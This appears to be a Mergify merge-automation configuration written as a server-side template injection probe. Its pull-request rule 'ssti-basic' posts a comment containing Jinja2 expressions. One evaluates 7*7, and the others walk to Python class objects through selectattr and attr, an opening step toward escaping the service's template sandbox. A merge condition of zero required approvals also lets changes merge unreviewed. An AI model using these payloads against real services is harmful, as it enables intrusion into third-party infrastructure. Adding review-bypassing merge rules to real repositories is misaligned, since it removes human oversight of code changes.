pull_request_rules:
  - name: ssti-basic
    conditions:
      - base=main
    actions:
      comment:
        message: |
          SSTI={{ 7*7 }}
          CLASS={{ [dict]|selectattr("__class__")|first }}
          ATTR={{ [dict]|selectattr("__class__")|first|attr(title or "keys") }}

queue_rules:
  - name: default
    queue_conditions:
      - base=main
    merge_conditions:
      - "#approved-reviews-by>=0"
    merge_method: merge
    commit_message_template: "test"

merge_queue:
  max_parallel_checks: 1
